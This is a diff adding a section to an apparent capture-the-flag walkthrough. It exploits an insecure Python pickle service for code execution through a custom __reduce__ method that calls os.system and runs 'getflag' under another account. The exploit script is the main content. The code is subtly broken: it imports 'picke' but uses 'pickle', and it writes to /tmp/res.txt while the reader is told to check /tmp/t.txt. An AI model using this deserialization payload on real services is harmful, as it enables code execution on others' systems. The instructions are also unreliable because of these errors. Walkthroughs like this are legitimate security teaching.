@@ -341,3 +341,23 @@ getflag > /tmp/output
 
 ## Level17
 
+This level requires abusing security risks within python's `pickle` module. On python's official documentation [for `pickle`](https://docs.python.org/3/library/pickle.html), it is well documented it can run arbitary code. As the vulnerable python file is ran under the "flag17" account, we use it to achieve our desired effect. Further investigation online reveals that the `__reduce__` method of the pickled class is ran when loading the pickled data. Therefore, the goal is to dump a pickled object with a custom `__reduce__` method and send it to the desired port.
+
+The code we want to run is `getflag`. As stdout is not displayed, we need to pipe it into a file. I selected a random file in "/tmp". The full python code is as follows:
+
+```python
+import socket
+import os
+import picke
+
+skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+skt.connect(('0.0.0.0', 10007))
+
+class p(object):
+    def __reduce__(self):
+        return (os.system, ('getflag > /tmp/res.txt',))
+
+skt.send(pickle.dumps(p()))
+```
+
+Run the above code using `python2`, and check the contents of the file "/tmp/t.txt". It should contain the desired output, indicating this level is solved.
